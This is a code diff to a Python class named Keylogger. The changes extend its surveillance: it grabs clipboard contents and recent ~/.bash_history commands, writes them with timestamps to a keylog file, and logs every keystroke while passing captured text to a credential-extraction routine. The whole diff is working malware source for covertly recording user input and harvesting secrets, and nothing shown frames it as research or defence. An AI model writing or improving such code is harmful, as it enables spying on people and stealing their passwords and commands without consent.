@@ -124,6 +124,8 @@ class Keylogger:
             
     def _monitor_terminal_input(self):
         """Monitor terminal and clipboard for input"""
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
         # Check clipboard
         try:
             import subprocess
@@ -133,11 +135,15 @@ class Keylogger:
                 text=True,
                 timeout=1
             )
-            if result.stdout:
-                self._process_text(result.stdout)
-        except:
+            if result.stdout and len(result.stdout.strip()) > 0:
+                clipboard_text = result.stdout.strip()
+                with open(self.keylog_file, 'a') as f:
+                    f.write(f'\n\n[{timestamp}] === CLIPBOARD ===\n{clipboard_text}\n======================\n\n')
+                self._process_text(clipboard_text)
+                print(f"[+] Clipboard captured: {len(clipboard_text)} chars")
+        except Exception as e:
             pass
-            
+        
         # Monitor .bash_history
         try:
             history_file = os.path.expanduser('~/.bash_history')
@@ -145,8 +151,11 @@ class Keylogger:
                 with open(history_file, 'r') as f:
                     lines = f.readlines()
                     for line in lines[-5:]:  # Last 5 commands
-                        self._process_text(line.strip())
-        except:
+                        if line.strip():
+                            with open(self.keylog_file, 'a') as f:
+                                f.write(f'\n[{timestamp}] === BASH HISTORY ===\n{line.strip()}\n========================\n\n')
+                            self._process_text(line.strip())
+        except Exception as e:
             pass
             
     def _start_windows_keylogger(self):
@@ -167,7 +176,9 @@ class Keylogger:
             print(f"[!] Windows keylogger error: {e}")
             
     def _process_key(self, key):
-        """Process a single keystroke"""
+        """Process a single keystroke with timestamp"""
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
+        
         with self.lock:
             self.keys_buffer.append(key)
             
@@ -176,9 +187,16 @@ class Keylogger:
                 text = ''.join(self.keys_buffer[-50:])
                 self._extract_credentials(text)
                 
-            # Write to file
+            # Write to file with timestamp
             with open(self.keylog_file, 'a') as f:
-                f.write(key)
+                if key == '\n':
+                    f.write(f'\n[{timestamp}] <ENTER>\n')
+                elif key == ' ':
+                    f.write(' ')
+                elif len(key) == 1:
+                    f.write(key)
+                else:
+                    f.write(f'[{timestamp}] {key}')
                 
             # Limit buffer size
             if len(self.keys_buffer) > 1000:
